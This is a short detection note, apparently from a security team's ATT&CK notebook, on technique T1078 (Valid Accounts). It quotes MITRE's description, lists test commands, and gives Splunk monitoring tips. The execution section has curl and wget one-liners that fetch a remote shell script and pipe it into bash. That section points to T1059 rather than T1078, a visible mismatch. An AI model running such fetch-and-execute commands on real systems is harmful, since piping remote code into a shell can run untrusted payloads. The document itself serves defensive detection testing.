# T1078 - Valid Accounts
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1078)
<blockquote>
Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access.

Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

Adversaries may also create accounts, sometimes using pre-defined account names and passwords, as a means for persistence through backup access in case other means are unsuccessful.

The overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.

## Assumptions
Attacker or local user has access to command propmpt or powershell

## Execution:
[Test using Atomic Red Team](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059/T1059.md)

<blockquote>
```
bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
```
</blockquote>

or any commandline or powershel command

## Detection:
* Monitor CommandLine activity (including powershell)
* [Read Mitre ATT&CK for more Detection info](https://attack.mitre.org/wiki/Technique/T1059)

### Visibility
* Windows event log
* Enable Commandline audit
* Command line / Powershell activity

### Filter / Correlation in Splunk
Following catch both comandline and powershell, although they can be separated in two. 

```
"CommandLine:*"
```
